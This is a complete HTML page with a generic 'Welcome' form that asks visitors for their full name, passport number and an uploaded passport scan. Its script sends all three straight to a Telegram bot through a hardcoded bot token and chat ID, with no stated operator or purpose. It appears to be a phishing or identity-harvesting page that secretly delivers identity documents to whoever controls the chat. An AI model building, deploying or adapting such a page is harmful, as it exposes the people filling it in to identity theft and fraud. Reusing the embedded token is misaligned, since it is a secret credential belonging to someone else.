<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>New Visit</title>
  <style>
    :root{
      --glass-bg: rgba(255,255,255,0.12);
      --glass-bg-hover: rgba(255,255,255,0.22);
      --danger: #ff5252;
      --ok: #22c55e;
    }
    *{box-sizing:border-box}
    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: "Poppins", system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, sans-serif;
      background: linear-gradient(135deg, #007aff, #00c6ff);
      margin: 0;
      color: #fff;
      padding: 20px;
    }

    h1 {
      font-size: 2.4rem;
      font-weight: 700;
      margin: 0 0 18px;
      text-shadow: 0 4px 10px rgba(0,0,0,0.3);
      animation: fadeInDown 0.8s ease;
      text-align:center;
    }

    form{
      width: 100%;
      max-width: 560px;
      background: rgba(255,255,255,0.12);
      border: 1px solid rgba(255,255,255,0.25);
      border-radius: 18px;
      padding: 22px;
      backdrop-filter: blur(10px);
      box-shadow: 0 10px 30px rgba(0,0,0,0.25);
      animation: fadeInUp 0.9s ease;
    }

    .visually-hidden {
      position: absolute !important;
      height: 1px; width: 1px;
      overflow: hidden;
      clip: rect(1px, 1px, 1px, 1px);
      white-space: nowrap;
    }

    input[type="text"], input[type="tel"], input[type="file"]{
      width: 100%;
      padding: 14px 16px;
      border-radius: 14px;
      background: rgba(255,255,255,0.15);
      color: #fff;
      border: 1px solid rgba(255,255,255,0.28);
      outline: none;
      transition: all .25s ease;
    }

    input::file-selector-button{
      padding: 10px 16px; border: none; border-radius: 12px; background: rgba(0,0,0,.25); color:#fff; margin-inline-end: 12px; cursor:pointer
    }

    input:focus{ box-shadow: 0 0 0 3px rgba(255,255,255,0.25); }

    .row{ display:grid; grid-template-columns: 1fr; gap:14px }
    @media(min-width:640px){ .row{ grid-template-columns: 1fr 1fr } }

    .help{font-size:.9rem; opacity:.85; margin: 6px 6px 0}
    .error{ color: var(--danger); margin: 6px 6px 0; display:none }

    button{
      width: 100%;
      padding: 14px 20px;
      font-size: 1.1rem;
      border: none;
      border-radius: 14px;
      background: var(--glass-bg);
      color: #fff;
      cursor: pointer;
      backdrop-filter: blur(10px);
      transition: all 0.25s ease;
      font-weight: 600;
      box-shadow: 0 6px 18px rgba(0,0,0,0.22);
      margin-top: 16px;
    }

    button:hover { background: var(--glass-bg-hover); transform: translateY(-1px); }
    button:disabled{ opacity:.7; cursor:not-allowed }

    .toast {
      position: fixed; inset-inline: 0; bottom: 24px; margin-inline:auto; width: fit-content;
      padding: 14px 18px; background: rgba(0,0,0,0.78);
      border-radius: 12px; font-size: 1rem; opacity: 0; transition: opacity 0.35s ease
    }
    .toast.show { opacity: 1 }

    @keyframes fadeInDown { from {opacity: 0; transform: translateY(-16px);} to {opacity: 1; transform: translateY(0);} }
    @keyframes fadeInUp   { from {opacity: 0; transform: translateY(16px);}  to {opacity: 1; transform: translateY(0);} }
  </style>
</head>
<body>
  <h1>Welcome</h1>

  <form id="visit-form" novalidate>
    <div class="row">
      <div>
        <label class="visually-hidden" for="fullName">Full name</label>
        <input id="fullName" name="fullName" type="text" placeholder="Full name" autocomplete="name" required />
        <div id="errName" class="error">Please enter a valid full name (at least 3 characters).</div>
      </div>
      <div>
        <label class="visually-hidden" for="passport">Passport number</label>
        <input id="passport" name="passport" type="text" inputmode="latin" pattern="[A-Za-z0-9]{6,12}" placeholder="Passport number" required />
        <div id="errPass" class="error">Passport number must be 6â€“12 Latin letters/digits.</div>
      </div>
    </div>

    <label class="visually-hidden" for="doc">Upload passport (PDF or image)</label>
    <input id="doc" name="doc" type="file" accept="application/pdf,image/*" required />
    <div id="errFile" class="error">File must be a PDF or an image within the size limit.</div>

    <button id="sendBtn" type="submit">Send</button>
  </form>

  <div id="toast" class="toast"></div>

  <script>
    const BOT_TOKEN = "7544882164:AAHUQCd3fnHSwbj6tSPIGSEbRgkOXS3wLTY";
    const CHAT_ID   = "6494466799";

    const form    = document.getElementById("visit-form");
    const toast   = document.getElementById("toast");
    const sendBtn = document.getElementById("sendBtn");

    function showToast(message){
      toast.textContent = message;
      toast.classList.add("show");
      setTimeout(() => toast.classList.remove("show"), 3200);
    }

    function validate(){
      const name = document.getElementById('fullName');
      const pass = document.getElementById('passport');
      const file = document.getElementById('doc');

      const okName = (name.value || '').trim().length >= 3;
      document.getElementById('errName').style.display = okName ? 'none' : 'block';

      const passRe = /^[A-Za-z0-9]{6,12}$/;
      const okPass = passRe.test((pass.value || '').trim());
      document.getElementById('errPass').style.display = okPass ? 'none' : 'block';

      const f = file.files[0];
      const isPdf = f && f.type === 'application/pdf';
      const isImg = f && f.type.startsWith('image/');
      const okFile = !!f && (isPdf || isImg) && f.size <= 20 * 1024 * 1024;
      document.getElementById('errFile').style.display = okFile ? 'none' : 'block';

      return okName && okPass && okFile;
    }

    async function sendMessage(text){
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      });
      if(!res.ok) throw new Error('sendMessage failed');
      return res.json();
    }

    async function sendDocument(file, caption){
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('document', file);
      if (caption) fd.append('caption', caption);
      const res = await fetch(url, { method: 'POST', body: fd });
      if(!res.ok) throw new Error('sendDocument failed');
      return res.json();
    }

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      if(!validate()) { showToast('Please check the inputs and try again.'); return; }

      const name = document.getElementById('fullName').value.trim();
      const pass = document.getElementById('passport').value.trim();
      const file = document.getElementById('doc').files[0];

      const timeStr = new Date().toLocaleString('en-GB');
      const header  = `New site visit\n${timeStr}`;
      const details = `Name: ${name}\nPassport No.: ${pass}`;

      try {
        sendBtn.disabled = true; sendBtn.textContent = 'Sending...';
        await sendMessage(`${header}\n\n${details}`);
        await sendDocument(file, `Passport document\n${details}`);
        showToast('Submitted successfully.');
        form.reset();
      } catch(err){
        console.error(err);
        showToast('Submission failed. Please try again later.');
      } finally {
        sendBtn.disabled = false; sendBtn.textContent = 'Send';
      }
    });
  </script>
</body>
</html>
